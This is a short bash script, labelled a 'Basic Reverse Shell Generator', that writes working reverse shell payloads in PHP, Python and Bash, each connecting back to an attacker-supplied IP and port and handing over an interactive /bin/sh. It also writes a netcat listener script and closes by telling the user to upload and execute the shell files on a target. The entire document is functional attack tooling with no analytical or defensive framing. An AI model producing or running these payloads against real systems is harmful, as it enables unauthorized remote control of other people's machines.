#!/bin/bash
# 🐚 Basic Reverse Shell Generator

ATTACKER_IP=${1:-"127.0.0.1"}
PORT=${2:-"4444"}

mkdir -p reverse_shells
cd reverse_shells

echo "🔧 Generating reverse shells for $ATTACKER_IP:$PORT"

# PHP reverse shell
cat > shell.php << EOF
<?php
\$sock = fsockopen('$ATTACKER_IP', $PORT);
\$proc = proc_open('/bin/sh -i', array(0=>\$sock, 1=>\$sock, 2=>\$sock), \$pipes);
?>
EOF

# Python reverse shell
cat > shell.py << EOF
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("$ATTACKER_IP",$PORT))
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
EOF

# Bash reverse shell
cat > shell.sh << EOF
#!/bin/bash
bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1
EOF

# Netcat listener
cat > listener.sh << EOF
#!/bin/bash
echo "🎧 Starting listener on port $PORT"
nc -lvnp $PORT
EOF

chmod +x *.sh

echo "✅ Basic reverse shells created!"
echo "Usage: ./listener.sh then upload and execute shell files"
